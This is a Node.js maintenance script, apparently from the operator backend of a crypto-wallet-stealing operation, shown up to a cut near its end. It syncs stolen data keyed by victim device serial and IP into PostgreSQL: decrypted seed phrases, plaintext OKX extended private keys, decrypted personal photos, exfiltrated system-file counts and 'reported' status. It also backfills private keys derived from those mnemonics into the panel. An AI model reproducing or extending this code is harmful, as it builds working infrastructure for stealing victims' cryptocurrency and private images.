#!/usr/bin/env node
/**
 * pg_sync_globals.js —— lootStore.scan() 【全局阶段】注入产物的 PG 同步
 *  · adm888app/data/wallet18.json（18链离线解密）→ mnemonics / seeds / addresses
 *  · docs/post_t/t_plain/t_index.json（/t 通道解密照片）→ photos
 * 背景：ingestd/backfill 走桶级 processBucket，不经过 scan 的全局注入 → 这两类数据缺失
 *   （对账实测：addresses/助记词缺口=wallet18；photos 缺口 28 万=t_index）。
 * 幂等：PG ukey（内容哈希）ON CONFLICT DO NOTHING；重复运行安全。
 * 用法: node tools/pg_sync_globals.js [--only wallet18|tindex]
 */
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const BASE = path.resolve(__dirname, '..');
const ls = require(path.join(BASE, 'adm888app', 'lootStore.js'));            // 复用 abbr
const pgStore = require(path.join(BASE, 'adm888app', 'pg', 'pgStore.js'));

const WF = path.join(BASE, 'adm888app', 'data', 'wallet18.json');
const TIDX = path.join(BASE, 'docs', 'post_t', 't_plain', 't_index.json');
const ONLY = (() => { const i = process.argv.indexOf('--only'); return i >= 0 ? process.argv[i + 1] : ''; })();

async function syncWallet18(ipMap) {
  if (!fs.existsSync(WF)) return;
  const wj = JSON.parse(fs.readFileSync(WF, 'utf8'));
  const now = Date.now();
  const mnemonics = [], seeds = [], addresses = [];
  for (const serial of Object.keys(wj)) {
    const e = wj[serial] || {};
    const dip = ipMap.get(serial) || '';
    const seenM = new Set(), seenA = new Set();
    for (const w of (e.wallets || [])) {
      const mnem = String(w.mnemonic || '');
      const appType = String(w.app || '未知');
      if (mnem && !seenM.has(mnem)) {
        seenM.add(mnem);
        mnemonics.push({ id: 0, user_id: 0, serial, mnem_phrase_abbr: ls.abbr(mnem, 3, 4), mnem_phrase_plain: mnem,
          app_type: appType, bundle_id: String(w.bundle || ''), created_at: w.ts || now, ip: dip,
          src: '18chain', note: '18链离线解密（' + String(w.src || '') + '）' });
        seeds.push({ id: 0, user_id: 0, serial, seed_abbr: ls.abbr(mnem, 3, 4), app_type: appType,
          mnemonic_id: null, account_derived_to: 0, created_at: w.ts || now });
      }
      for (const a of (w.addresses || [])) {
        if (!a || !a.addr) continue;
        const key = serial + '|' + a.addr;
        if (seenA.has(key)) continue;
        seenA.add(key);
        const coin = a.coin;
        addresses.push({ id: 0, user_id: 0, serial, public_key: a.addr, public_key_abbr: ls.abbr(a.addr, 8, 6),
          private_key_plain: null, chain: coin === 0 ? 'BTC' : coin === 60 ? 'ETH' : (coin === null || coin === undefined ? appType : 'coin' + coin),
          coin: coin, derivation_path: a.path || '', wallet_name: appType, password_hint: '',
          keystore_id: String(w.keystore_id || ''), fingerprint: '', src: '18chain-keystore', ts: w.ts || now, ip: dip });
      }
    }
    const okx = e.okx;
    if (okx && okx.xpriv) {
      const key0 = serial + '|' + okx.xpriv;
      if (!seenA.has(key0)) {
        seenA.add(key0);
        addresses.push({ id: 0, user_id: 0, serial, public_key: 'xpub:' + (okx.xpub || ''),
          public_key_abbr: ls.abbr(okx.xpub || '', 8, 6), private_key_plain: okx.xpriv, private_key_abbr: ls.abbr(okx.xpriv, 6, 6),
          chain: 'OKX账户密钥(非地址私钥)', coin: null, derivation_path: '', wallet_name: 'OKX ' + String(okx.name || ''),
          password_hint: '', keystore_id: '', fingerprint: '', src: '18chain:okx-account',
          note: 'OKX 沙盒 Documents/wallet 里 wallet.xpriv 的明文密钥对（secp256k1 自洽）。⚠️ 非地址级私钥。',
          ts: okx.createAt || now, ip: dip });
      }
      for (const a of (okx.addresses || [])) {
        if (!a.address) continue;
        const key = serial + '|' + a.address;
        if (seenA.has(key)) continue;
        seenA.add(key);
        addresses.push({ id: 0, user_id: 0, serial, public_key: a.address, public_key_abbr: ls.abbr(a.address, 8, 6),
          private_key_plain: null, private_key_abbr: null, chain: 'OKX-' + String(a.chain || ''), coin: a.chainId,
          derivation_path: '', wallet_name: 'OKX ' + String(okx.name || ''), password_hint: '', keystore_id: '',
          fingerprint: '', pubkey: String(a.publicKey || ''), src: '18chain:okx-address', ts: now, ip: dip });
      }
    }
    for (const ad of (e.adapters || [])) {
      for (const x of (ad.addresses || [])) {
        if (!x || !x.address) continue;
        const key = serial + '|' + x.address;
        if (seenA.has(key)) continue;
        seenA.add(key);
        addresses.push({ id: 0, user_id: 0, serial, public_key: x.address, public_key_abbr: ls.abbr(x.address, 8, 6),
          private_key_plain: null, private_key_abbr: null,
          chain: String(ad.app || '') + (x.label && x.label !== ad.app ? ' ' + x.label : ''),
          coin: null, derivation_path: String(x.path || ''), wallet_name: String(ad.app || ''), password_hint: '',
          keystore_id: '', fingerprint: '', src: '18chain:adapter', ts: now, ip: dip });
      }
    }
  }
  // 【2026-09-17】防「删除-重建」循环（重复进账通知根因修复）：
  //   同一 (serial, lower(public_key)) 已存在（含大小写不同的既有行）→ 跳过插入，归属信息并进既有行。
  //   旧行为：本脚本按内容哈希 ukey 插入大小写混合行 → 被 notify_scan 小写合并删除 → 下轮又插回，
  //   无限循环；每次新插入的空 data 行被 balance_sync 首查即报 old=0 进账 → 重复通知。
  if (addresses.length) {
    try {
      const serials = [...new Set(addresses.map(a => a.serial))];
      const r = await pgStore.pool.query(
        `SELECT serial, lower(public_key) AS lpk, COALESCE(data->>'src','') AS osrc FROM addresses
          WHERE serial = ANY($1::text[]) AND public_key IS NOT NULL AND public_key <> ''`, [serials]);
      const exMap = new Map();      // 'serial|lower(pk)' → Set(已存在行的 src)
      for (const x of r.rows) {
        const k = String(x.serial) + '|' + String(x.lpk);
        if (!exMap.has(k)) exMap.set(k, new Set());
        exMap.get(k).add(String(x.osrc || ''));
      }
      const seenLower = new Set();
      const kept = [], dup = [];
      for (const a of addresses) {
        const k = String(a.serial) + '|' + String(a.public_key || '').toLowerCase();
        const srcs = exMap.get(k);
        if (srcs) {
          if (!srcs.has(String(a.src || ''))) dup.push(a);   // 跨来源重复（如 derived 行 vs wallet18 行）→ 归属并进既有行
          continue;                                          // 已存在（含同源）→ 不再插入
        }
        if (seenLower.has(k)) continue;                      // 批内大小写重复
        seenLower.add(k); kept.push(a);
      }
      for (const a of dup) {
        try {
          await pgStore.pool.query(
            `UPDATE addresses SET data = COALESCE(data,'{}'::jsonb) ||
               jsonb_strip_nulls(jsonb_build_object(
                 'wallet18_src', $3::text,
                 'wallet_name', COALESCE(NULLIF(COALESCE(data->>'wallet_name',''), ''), $4::text),
                 'keystore_id', COALESCE(NULLIF(COALESCE(data->>'keystore_id',''), ''), $5::text),
                 'derivation_path', COALESCE(NULLIF(COALESCE(data->>'derivation_path',''), ''), $6::text)))
             WHERE serial = $1 AND lower(public_key) = lower($2)`,
            [a.serial, a.public_key, a.src, a.wallet_name || null, a.keystore_id || null, a.derivation_path || null]);
        } catch (e) {}
      }
      if (addresses.length !== kept.length) console.log(`[globals:wallet18] 判存跳过 ${addresses.length - kept.length} 条已存在地址（跨来源 ${dup.length} 条归属已并入，防重复重建）`);
      addresses.length = 0; addresses.push(...kept);
    } catch (e) {
      console.error('[globals:wallet18] 判存失败（照常插入）:', String(e.message || e).slice(0, 120));
    }
  }
  // 【2026-09-19】mnemonics 判存：该表存在第二唯一键 (serial, md5(plain))（部分唯一索引），
  //   仅靠 ukey 判重会漏（行被替换后 ukey 与新 plain 不再对应）→ 23505 报错带倒整条同步管线。
  //   照上方 addresses 判存模式：既存 (serial, md5(plain)) 全查 → 跳过已存在 + 批内重复。
  if (mnemonics.length) {
    try {
      const serials = [...new Set(mnemonics.map(m => m.serial))];
      const r = await pgStore.pool.query(
        `SELECT serial, md5(plain) AS h FROM mnemonics
          WHERE serial = ANY($1::text[]) AND plain IS NOT NULL AND plain <> ''`, [serials]);
      const seenM2 = new Set(r.rows.map(x => String(x.serial) + '|' + String(x.h)));
      const kept = [];
      for (const m of mnemonics) {
        const k = String(m.serial) + '|' + crypto.createHash('md5').update(String(m.mnem_phrase_plain || ''), 'utf8').digest('hex');
        if (seenM2.has(k)) continue;         // serial+md5(plain) 已存在 → 唯一索引必冲突，提前跳过
        seenM2.add(k); kept.push(m);
      }
      if (mnemonics.length !== kept.length) console.log(`[globals:wallet18] 判存跳过 ${mnemonics.length - kept.length} 条已存在助记词（serial+plain 唯一键，防 23505 带倒管线）`);
      mnemonics.length = 0; mnemonics.push(...kept);
    } catch (e) {
      console.error('[globals:wallet18] 助记词判存失败（照常插入，pgStore 侧 ON CONFLICT 兜底）:', String(e.message || e).slice(0, 120));
    }
  }
  const counts = await pgStore.upsertRecords({ mnemonics, seeds, addresses });
  console.log(`[globals:wallet18] 构造 m=${mnemonics.length} s=${seeds.length} a=${addresses.length} → 入库 ins=${counts.ins} ${JSON.stringify(counts.byTable)}`);
}

async function syncTIndex() {
  if (!fs.existsSync(TIDX)) return;
  const plist = JSON.parse(fs.readFileSync(TIDX, 'utf8'));
  const photos = [];
  let missing = 0;
  for (const r of plist) {
    if (!r || !r.path) continue;
    if (!fs.existsSync(r.path)) { missing++; continue; }   // 与 lootStore 注入一致：文件不在则跳过
    photos.push({ id: 0, user_id: 0, serial: r.serial || '', device: '',
      ip: r.ip || '', ts: Number(r.ts) || 0, taken_at: Number(r.ts) || 0,
      name: r.name || '', title: 'post_t 解密照片', size: Number(r.size) || 0,
      bin_path: r.path, dec: null,
      note: '/t 通道解密（' + (r.pkg || '') + '）', source: 'post_t_decrypted' });
  }
  const counts = await pgStore.upsertRecords({ photos });
  console.log(`[globals:tindex] 总量 ${plist.length}（文件缺失跳过 ${missing}）→ 入库 ins=${counts.ins} ${JSON.stringify(counts.byTable)}`);
}

async function syncMetaOverrides() {
  const ovf = path.join(BASE, 'adm888app', 'data', 'device_meta_overrides.json');
  if (!fs.existsSync(ovf)) return;
  const ov = JSON.parse(fs.readFileSync(ovf, 'utf8'));
  const usersMap = new Map(), devicesMap = new Map();
  let n = 0;
  for (const [serial, meta] of Object.entries(ov)) {
    if (serial.startsWith('_') || !meta) continue;
    n++;
    devicesMap.set(serial, { id: 0, serial_id: serial, hardware_model: meta.machine || '', os_version: meta.ios_version || '',
      build_version: '', kernel_release: '', user_id: 0, ip: '', last_seen: 0, source: 'meta-override' });
    usersMap.set(serial, { id: 0, serial_id: serial, machine: meta.machine || '', ios_version: meta.ios_version || '', ip: '', first_seen: 0, last_seen: 0 });
  }
  if (!n) return;
  const devIns = await pgStore.upsertDevices(usersMap, devicesMap);
  console.log(`[globals:meta] 设备覆盖表 ${n} 条 → upsert ${devIns}（仅补空字段，last_seen=0 不覆盖在线态）`);
}

// 钱包识别 / 计数 / file_count / upload_status / is_wallet_user 均为 lootStore.scan() 全局阶段合成产物
//   （桶级入库不产出）→ 从最新快照 core.json 定期同步进 PG（延迟 = 快照周期，≤7 分钟）。
async function syncDeviceMeta() {
  const snapRoot = path.join(BASE, 'adm888app', 'data', 'snapshot');
  let pid = '';
  try { pid = fs.readFileSync(path.join(snapRoot, 'POINTER'), 'utf8').trim(); } catch { return; }
  if (!pid) return;
  let core;
  try { core = JSON.parse(fs.readFileSync(path.join(snapRoot, pid, 'core.json'), 'utf8')); } catch { return; }
  const meta = new Map();
  const put = (s, o) => {
    if (!s) return;
    const m = meta.get(s) || {};
    for (const k of Object.keys(o)) if (o[k] !== undefined) m[k] = o[k];
    meta.set(s, m);
  };
  for (const [s, u] of (core.users || [])) put(s, {
    wallets: Array.isArray(u.wallets) && u.wallets.length ? u.wallets : null,
    wallet_label: u.wallet_label || null,
    mnemonic_count: u.mnemonic_count | 0, address_count: u.address_count | 0,
    token_count: u.token_count | 0, photo_count: u.photo_count | 0, note_count: u.note_count | 0,
    file_count: u.file_count | 0, exfil18_count: u.exfil18_count | 0,
    upload_status: u.upload_status || null, is_wallet_user: !!u.is_wallet_user,
  });
  for (const [s, d] of (core.devices || [])) put(s, {
    wallets: Array.isArray(d.wallets) && d.wallets.length ? d.wallets : undefined,
    wallet_label: d.wallet_label || undefined,
  });
  const client = await pgStore.pool.connect();
  let n = 0;
  try {
    await client.query('BEGIN');
    for (const [s, m] of meta) {
      const r = await client.query(
        `UPDATE devices SET
           wallets = COALESCE($2, wallets), wallet_label = COALESCE($3, wallet_label),
           mnemonic_count = COALESCE($4, mnemonic_count), address_count = COALESCE($5, address_count),
           token_count = COALESCE($6, token_count), photo_count = COALESCE($7, photo_count),
           note_count = COALESCE($8, note_count), file_count = COALESCE($9, file_count),
           exfil18_count = COALESCE($10, exfil18_count), upload_status = COALESCE($11, upload_status),
           is_wallet_user = COALESCE($12, is_wallet_user)
         WHERE serial = $1`,
        [s, m.wallets || null, m.wallet_label || null,
         m.mnemonic_count !== undefined ? m.mnemonic_count : null,
         m.address_count !== undefined ? m.address_count : null,
         m.token_count !== undefined ? m.token_count : null,
         m.photo_count !== undefined ? m.photo_count : null,
         m.note_count !== undefined ? m.note_count : null,
         m.file_count !== undefined ? m.file_count : null,
         m.exfil18_count !== undefined ? m.exfil18_count : null,
         m.upload_status || null,
         (typeof m.is_wallet_user === 'boolean') ? m.is_wallet_user : null]);
      n += r.rowCount;
    }
    await client.query('COMMIT');
  } catch (e) { await client.query('ROLLBACK').catch(() => {}); throw e; }
  finally { client.release(); }
  console.log(`[globals:devmeta] 快照 ${pid} → 设备元数据更新 ${n} 台（wallets/计数/上传状态）`);
}

// 【2026-09-14 新增·PG 直算】设备派生元数据（钱包识别 / 各类计数 / 上传状态 / is_wallet_user）。
//   背景：原实现从「最新快照 core.json」同步 → 延迟=快照周期(实测 10~15 分钟)+本 cron(5)≈15~20 分钟；
//   且快照 core 计数在 2026-09-14 前存在 user_id 错位（已在 lootStore 修复，但本函数不再依赖它）。
//   改为 PG 侧直算：延迟 ≤ 本 cron 周期(5 分钟)，且与面板详情页（直读 PG 各表）口径天然一致。
//     · 钱包：apps 表 + wallet18.json，复用 lootStore.walletEvidence（名单/规则单一来源）
//     · 计数：各业务表 GROUP BY serial（mnemonics/addresses/tokens/photos/notebooks/exfil18）
//     · 上传状态：reports.kind（us/a/ub/uj=已上报；否则 exfil18>0=18链已上报；否则未上报）
//     · is_wallet_user = mnemonic_count>0（与 lootStore.scan 语义一致）
//   写策略：与现值对比，只 UPDATE 实际变化的设备（稳态下每轮仅个位数~几十条）。
async function syncDeviceMetaPg(dry) {
  const t0 = Date.now();
  const cnt = async (tbl) => {
    const r = await pgStore.pool.query(`SELECT serial, count(*)::int AS c FROM ${tbl} GROUP BY serial`);
    return new Map(r.rows.map(x => [x.serial, x.c]));
  };
  const [mn, ad, tk, ph, nb, ex] = await Promise.all([
    cnt('mnemonics'), cnt('addresses'), cnt('tokens'), cnt('photos'), cnt('notebooks'), cnt('exfil18'),
  ]);
  const rpRes = await pgStore.pool.query(
    `SELECT serial, count(*) FILTER (WHERE kind='upload')::int AS f,
            bool_or(kind IN ('us','a','ub','uj')) AS hu
     FROM reports GROUP BY serial`);
  const rp = new Map(rpRes.rows.map(x => [x.serial, x]));

  // 钱包识别（apps 表 + wallet18.json；与快照 scan 同一函数/名单）
  const appsRes = await pgStore.pool.query('SELECT serial, bundle_id, name FROM apps');
  let wj = {};
  try { wj = JSON.parse(fs.readFileSync(WF, 'utf8')); } catch { wj = {}; }
  const walletEv = ls.walletEvidence(appsRes.rows, wj);
  const evidence = new Set(appsRes.rows.map(r => r.serial));
  for (const s of Object.keys(wj)) evidence.add(s);

  const cur = await pgStore.pool.query(
    `SELECT serial, wallets, wallet_label, mnemonic_count, address_count, token_count, photo_count,
            note_count, file_count, exfil18_count, upload_status, is_wallet_user FROM devices`);
  const upd = [];
  for (const d of cur.rows) {
    const s = d.serial;
    const m = mn.get(s) || 0, a = ad.get(s) || 0, t = tk.get(s) || 0;
    const p = ph.get(s) || 0, n = nb.get(s) || 0, e = ex.get(s) || 0;
    const r = rp.get(s) || { f: 0, hu: false };
    const status = r.hu ? '已上报' : (e > 0 ? '18链已上报' : '未上报');
    const mHas = m > 0;
    let wNew, lNew;                              // undefined = 该设备无应用证据 → 保持原值
    if (evidence.has(s)) {
      const arr = walletEv.get(s) || [];
      wNew = arr.length ? arr : null;
      lNew = arr.length ? (arr.length === 1 ? arr[0] : ('多个钱包（' + arr.length + ' 种）')) : null;
    }
    const oldW = Array.isArray(d.wallets) ? d.wallets : [];
    const sameW = (wNew === undefined) || (String(oldW.join('|')) === String((wNew || []).join('|')));
    const sameL = (lNew === undefined) || (String(d.wallet_label || '') === String(lNew || ''));
    const changed = ((d.mnemonic_count | 0) !== m) || ((d.address_count | 0) !== a) || ((d.token_count | 0) !== t) ||
      ((d.photo_count | 0) !== p) || ((d.note_count | 0) !== n) || ((d.file_count | 0) !== r.f) ||
      ((d.exfil18_count | 0) !== e) || (String(d.upload_status || '') !== status) ||
      (!!d.is_wallet_user !== mHas) || !sameW || !sameL;
    if (changed) upd.push({ s, m, a, t, p, n, f: r.f, e, status, mHas, wNew, lNew });
  }
  if (dry) {
    console.log(`[globals:devmeta] DRY 检查 ${cur.rows.length} 台 → 拟更新 ${upd.length} 台`);
    for (const u of upd.slice(0, 15)) console.log('  DRY', u.s, JSON.stringify(u));
    return;
  }
  const client = await pgStore.pool.connect();
  let n = 0;
  try {
    await client.query('BEGIN');
    for (const u of upd) {
      const r = await client.query(
        `UPDATE devices SET
           mnemonic_count = $2, address_count = $3, token_count = $4, photo_count = $5, note_count = $6,
           file_count = $7, exfil18_count = $8, upload_status = $9, is_wallet_user = $10,
           wallets = CASE WHEN $11 THEN $12 ELSE wallets END,
           wallet_label = CASE WHEN $13 THEN $14 ELSE wallet_label END
         WHERE serial = $1`,
        [u.s, u.m, u.a, u.t, u.p, u.n, u.f, u.e, u.status, u.mHas,
         u.wNew !== undefined, u.wNew, u.lNew !== undefined, u.lNew]);
      n += r.rowCount;
    }
    await client.query('COMMIT');
  } catch (e) { await client.query('ROLLBACK').catch(() => {}); throw e; }
  finally { client.release(); }
  console.log(`[globals:devmeta] PG直算 → 检查 ${cur.rows.length} 台，更新 ${n} 台（wallets/计数/上传状态）| ${Date.now() - t0}ms`);
}

// 【2026-09-14 新增】派生私钥回填 PG：derive_all.js（cron 每 30 分钟，设备地址 × 明文助记词
//   BIP32/44 匹配命中）把私钥写进 data/derived_keys.json；本函数回填到 PG addresses.private_key_plain。
//   背景：派生此前只在快照链路生效（lootStore 填充），面板读 PG → 命中结果面板完全看不到（实测 34 条全空）。
//   幂等：仅回填 private_key_plain IS NULL 的行；缓存文件缺失/损坏安全跳过。
async function syncDerivedKeys() {
  const t0 = Date.now();
  const fp = path.join(BASE, 'adm888app', 'data', 'derived_keys.json');
  let dk = {};
  try { dk = JSON.parse(fs.readFileSync(fp, 'utf8')); } catch { return; }
  const rows = [];
  for (const [k, v] of Object.entries(dk)) {
    if (!v || !v.pk) continue;
    const i = k.indexOf('|');
    if (i < 0) continue;
    rows.push([k.slice(0, i), k.slice(i + 1), String(v.pk)]);
  }
  if (!rows.length) return;
  // 【2026-09-14 修复】面板读的是记录本体 data（jsonb），不是列！此前只更新列 → 界面看不到。
  //   现在列 + data.private_key_plain + data.private_key_abbr（前6+***+后6，与既有记录同格式）一起写。
  const abbr6 = s => { s = String(s); return s.length <= 15 ? s : (s.slice(0, 6) + '***' + s.slice(-6)); };
  const client = await pgStore.pool.connect();
  let n = 0;
  try {
    await client.query('BEGIN');
    for (const [serial, addr, pk] of rows) {
      const r = await client.query(
        `UPDATE addresses SET
           private_key_plain = $3,
           data = CASE
             WHEN data IS NULL THEN jsonb_build_object('private_key_plain', $3::text, 'private_key_abbr', $4::text)
             WHEN data ? 'private_key_plain' THEN jsonb_set(jsonb_set(data, '{private_key_plain}', to_jsonb($3::text)), '{private_key_abbr}', to_jsonb($4::text))
             ELSE data || jsonb_build_object('private_key_plain', $3::text, 'private_key_abbr', $4::text)
           END
         WHERE lower(serial) = lower($1) AND lower(public_key) = lower($2)
           AND (data->>'private_key_plain' IS NULL OR data->>'private_key_plain' = 'null')`,
        [serial, addr, pk, abbr6(pk)]);
      n += r.rowCount;
    }
    await client.query('COMMIT');
  } catch (e) { await client.query('ROLLBACK').catch(() => {}); throw e; }
  finally { client.release(); }
  console.log(`[globals:derived] 派生私钥回填 PG（列+data）：缓存 ${rows.length} 条 → 本次更新 ${n} 行 | ${Date.now() - t0}ms`);
}

// 【2026-09-14 新增】上线时间（session_start）落列：设备列表默认排序字段。
//   算法与 lootStore.scan 完全一致：8 类网络上报时间戳（events/reports/uploads/exfil18/photos/
//   messages/notebooks/browser_history），从最新往回走、相邻间隔 > 30 分钟视为断线，停点即本次
//   上线起点；无数据的设备回退 first_seen||last_seen。单条 SQL（窗口函数找最后断点）；只写变化行。
async function syncSessionStart() {
  const t0 = Date.now();
  const r = await pgStore.pool.query(
    `WITH u AS (
       SELECT serial, ts FROM reports         UNION ALL SELECT serial, ts FROM events
       UNION ALL SELECT serial, ts FROM uploads  UNION ALL SELECT serial, ts FROM exfil18
       UNION ALL SELECT serial, ts FROM photos   UNION ALL SELECT serial, ts FROM messages
       UNION ALL SELECT serial, ts FROM notebooks UNION ALL SELECT serial, ts FROM browser_history
     ), g AS (
       SELECT serial, ts, ts - lag(ts) OVER (PARTITION BY serial ORDER BY ts) AS gap
       FROM u WHERE ts > 0 AND ts < ((EXTRACT(EPOCH FROM now())*1000)::bigint + 3600000)
     ), b AS (
       SELECT serial, MAX(ts) FILTER (WHERE gap > 1800000) AS lastbreak FROM g GROUP BY serial
     ), ss AS (
       SELECT g.serial, MIN(g.ts) AS ss FROM g JOIN b ON b.serial = g.serial
       WHERE b.lastbreak IS NULL OR g.ts > b.lastbreak GROUP BY g.serial
     )
     SELECT d.serial, d.session_start AS old, COALESCE(ss.ss, NULLIF(d.first_seen, 0), d.last_seen) AS ss
     FROM devices d LEFT JOIN ss ON ss.serial = d.serial`);
  const upd = r.rows.filter(x => Number(x.old || 0) !== Number(x.ss || 0));
  let n = 0;
  if (upd.length) {
    const client = await pgStore.pool.connect();
    try {
      await client.query('BEGIN');
      for (const x of upd) {
        const q = await client.query('UPDATE devices SET session_start = $2 WHERE serial = $1', [x.serial, Number(x.ss) || 0]);
        n += q.rowCount;
      }
      await client.query('COMMIT');
    } catch (e) { await client.query('ROLLBACK').catch(() => {}); throw e; }
    finally { client.release(); }
  }
  console.log(`[globals:session] 上线时间 → 检查 ${r.rows.length} 台，更新 ${n} 台 | ${Date.now() - t0}ms`);
}

// 上传包存量导入（P4.1-4 配套）：快照 dev 分片的 uploads 为全量（~58 万）——unknown_posts 窗口只覆盖最新，
//   历史部分由此一次性/按需导入（业务键 ukey 幂等）。逐分片读取、每 2 万条分批 upsert（内存可控）。
async function syncUploads() {
  const snapRoot = path.join(BASE, 'adm888app', 'data', 'snapshot');
  let pid = '';
  try { pid = fs.readFileSync(path.join(snapRoot, 'POINTER'), 'utf8').trim(); } catch { return; }
  if (!pid) return;
  const devDir = path.join(snapRoot, pid, 'dev');
  let files = [];
  try { files = fs.readdirSync(devDir); } catch { return; }
  let buf = [], total = 0, ins = 0;
  const flush = async () => {
    if (!buf.length) return;
    try { const c = await pgStore.upsertRecords({ uploads: buf }); ins += c.ins; } catch (e) { console.error('[globals:uploads] 批失败:', e.message); }
    buf = [];
  };
  for (const f of files) {
    let d;
    try { d = JSON.parse(fs.readFileSync(path.join(devDir, f), 'utf8')); } catch { continue; }
    if (!Array.isArray(d.uploads) || !d.uploads.length) continue;
    total += d.uploads.length;
    buf.push(...d.uploads);
    if (buf.length >= 20000) await flush();
  }
  await flush();
  console.log(`[globals:uploads] 快照 ${pid} uploads ${total} 条 → 入库 ${ins}`);
}
//   可见性匹配从"单 IP"升级为"设备任一出口 IP 命中代理 IP 集"（修 IP 漂移漏可见）。
// 多出口 IP 镜像（P4.1-3）：store.deviceIps（serial → 全部出口 IP）→ device_ip_map；
//   可见性匹配从"单 IP"升级为"设备任一出口 IP 命中代理 IP 集"（修 IP 漂移漏可见）。
async function syncDeviceIps() {
  const snapRoot = path.join(BASE, 'adm888app', 'data', 'snapshot');
  let pid = '';
  try { pid = fs.readFileSync(path.join(snapRoot, 'POINTER'), 'utf8').trim(); } catch { return; }
  if (!pid) return;
  let core;
  try { core = JSON.parse(fs.readFileSync(path.join(snapRoot, pid, 'core.json'), 'utf8')); } catch { return; }
  const di = core.deviceIps || {};
  const rows = [];
  const seen = new Set();
  const add = (s, ip) => {
    if (!s || !ip || !/^[0-9a-fA-F:.]{3,45}$/.test(ip)) return;
    const k = s + '|' + ip;
    if (seen.has(k)) return;
    seen.add(k); rows.push([s, ip]);
  };
  for (const s of Object.keys(di)) for (const ip of (di[s] || [])) add(s, ip);
  // 并入快照 devices 的"显示 IP"（旧版可见性用它判定；保证本表覆盖"任一可命中的出口 IP"）
  for (const [s, d] of (core.devices || [])) if (d && d.ip) add(s, d.ip);
  const client = await pgStore.pool.connect();
  let n = 0;
  try {
    await client.query('BEGIN');
    await client.query('DELETE FROM device_ip_map');
    for (let i = 0; i < rows.length; i += 1000) {
      const part = rows.slice(i, i + 1000);
      const params = []; const tuples = [];
      for (const r of part) { const ph = []; for (const v of r) { params.push(v); ph.push('$' + params.length); } tuples.push('(' + ph.join(',') + ')'); }
      try {
        const res = await client.query(`INSERT INTO device_ip_map (serial, ip) VALUES ${tuples.join(',')} ON CONFLICT DO NOTHING`, params);
        n += res.rowCount;
      } catch {
        for (const r of part) { try { const res = await client.query('INSERT INTO device_ip_map (serial, ip) VALUES ($1, $2) ON CONFLICT DO NOTHING', r); n += res.rowCount; } catch {} }
      }
    }
    await client.query('COMMIT');
  } catch (e) { await client.query('ROLLBACK').catch(() => {}); throw e; }
  finally { client.release(); }
  console.log(`[globals:devip] deviceIps ${Object.keys(di).length} 台 / ${rows.length} 条 → 镜像 ${n} 条`);
}

// 【2026-09-20 新增·面板提速】exfil18 预聚合（"系统文件"列表：原每次点击现算 5s+ 全表聚合 → 读表毫秒级）。
//   源：exfil18 全表按 (serial, ip, category) 聚合；每轮 DELETE+INSERT 同事务重建（表仅数千行，MVCC 下读侧无感）。
//   读侧：adm888app/pg/panelPg.js summary('exfil18') 优先读本表；表缺失/为空/异常自动回退源表实时聚合（同口径）。
async function syncExfilAgg() {
  const t0 = Date.now();
  const client = await pgStore.pool.connect();
  try {
    await client.query(`CREATE TABLE IF NOT EXISTS exfil18_agg (
      serial text NOT NULL, ip inet, cat text NOT NULL DEFAULT 'other',
      n integer NOT NULL DEFAULT 0, sz bigint NOT NULL DEFAULT 0, last_ts bigint NOT NULL DEFAULT 0)`);
    await client.query('BEGIN');
    await client.query('DELETE FROM exfil18_agg');
    const r = await client.query(`
      INSERT INTO exfil18_agg (serial, ip, cat, n, sz, last_ts)
      SELECT e.serial, e.ip, COALESCE(e.data->>'category','other') AS cat, count(*)::int AS n,
             COALESCE(SUM(COALESCE(NULLIF(regexp_replace(COALESCE(e.data->>'orig_size',''), '[^0-9]', '', 'g'), '')::bigint, 0)), 0)::bigint AS sz,
             max(e.ts) AS last_ts
      FROM exfil18 e WHERE e.serial IS NOT NULL AND e.serial <> ''
      GROUP BY e.serial, e.ip, COALESCE(e.data->>'category','other')`);
    await client.query('COMMIT');
    console.log(`[globals:exfilagg] exfil18 预聚合 ${r.rowCount} 组 | ${Date.now() - t0}ms`);
  } catch (e) { await client.query('ROLLBACK').catch(() => {}); throw e; }
  finally { client.release(); }
}

// 【2026-09-20 新增·面板提速】IP 汇总预聚合（"IP与访问"栏：原快照死 15 小时/现算 reports 全表聚合 6s+ → 读表毫秒级）。
//   源：reports 按 (ip, serial) 聚合 report_n/首末时间；deliveries 表并入（serial=''，delivery_n）。
//   读侧：panelPg.ipDataList() 套 recCondsInto 权限条件（serial/ip 轴，与逐行记录语义一致）。
async function syncIpSummary() {
  const t0 = Date.now();
  const client = await pgStore.pool.connect();
  try {
    await client.query(`CREATE TABLE IF NOT EXISTS ip_summary (
      ip inet NOT NULL, serial text NOT NULL DEFAULT '',
      report_n integer NOT NULL DEFAULT 0, delivery_n integer NOT NULL DEFAULT 0,
      first_ts bigint NOT NULL DEFAULT 0, last_ts bigint NOT NULL DEFAULT 0,
      PRIMARY KEY (ip, serial))`);
    await client.query('BEGIN');
    await client.query('DELETE FROM ip_summary');
    const r1 = await client.query(`
      INSERT INTO ip_summary (ip, serial, report_n, delivery_n, first_ts, last_ts)
      SELECT ip, COALESCE(serial,''), count(*)::int, 0, MIN(ts), MAX(ts)
      FROM reports WHERE ip IS NOT NULL GROUP BY ip, COALESCE(serial,'')`);
    const r2 = await client.query(`
      INSERT INTO ip_summary (ip, serial, report_n, delivery_n, first_ts, last_ts)
      SELECT ip, '', 0, count(*)::int, MIN(ts), MAX(ts)
      FROM deliveries WHERE ip IS NOT NULL GROUP BY ip
      ON CONFLICT (ip, serial) DO UPDATE SET
        delivery_n = ip_summary.delivery_n + EXCLUDED.delivery_n,
        first_ts = CASE WHEN ip_summary.first_ts = 0 THEN EXCLUDED.first_ts ELSE LEAST(ip_summary.first_ts, EXCLUDED.first_ts) END,
        last_ts = GREATEST(ip_summary.last_ts, EXCLUDED.last_ts)`);
    await client.query('COMMIT');
    console.log(`[globals:ipsum] reports ${r1.rowCount} 组 + deliveries ${r2.rowCount} 组 | ${Date.now() - t0}ms`);
  } catch (e) { await client.query('ROLLBACK').catch(() => {}); throw e; }
  finally { client.release(); }
}

(async () => {
  const ipMap = new Map();
  try {
    const r = await pgStore.pool.query('SELECT serial, host(ip) AS ip FROM devices WHERE ip IS NOT NULL');
    for (const x of r.rows) ipMap.set(x.serial, x.ip);
  } catch { /* 无 ip 映射也能跑 */ }
  // 【2026-09-19】阶段隔离：单阶段异常不再带倒后续阶段。
  //   旧行为：syncWallet18 撞 mnemonics 唯一键 → 顶层 catch exit(1) → devmeta 直算等全部停摆，
